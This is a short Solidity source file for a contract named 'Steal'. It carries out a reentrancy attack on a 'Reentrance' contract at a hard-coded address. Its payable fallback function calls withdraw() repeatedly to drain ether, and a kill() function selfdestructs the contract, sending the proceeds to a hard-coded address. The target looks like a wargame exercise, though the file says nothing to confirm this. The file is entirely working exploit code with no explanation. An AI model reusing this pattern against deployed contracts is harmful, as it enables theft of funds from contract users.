pragma solidity ^0.4.18;

contract Reentrance {
    function withdraw(uint _amount) public;
}


contract Steal {
    address public target = 0x268550722b1468dbc4de561de9230cb86638273b;
    address public me = 0x396a91cf013970961abcedc1e3310323b0586460;
    Reentrance public r;
    uint public count;
    uint public max = 10;
    uint256 public level = 0;

    function Steal() public {
        r = Reentrance(target);
    }

    event LogFallback(uint c, uint balance);

    function () payable {
        count++;
        LogFallback(count, this.balance);
        if (count < 11) {
            r.withdraw(0.0001 ether);
        }
    }

    function setLevel(uint256 _level) public {
        level = _level;
    }

    function setMax(uint256 _max) public {
        max = _max;
    }

    function exploit() public {
        count = 0;
        r.withdraw(0.0001 ether);
    }

    function kill() public {
        selfdestruct(me);
    }
}
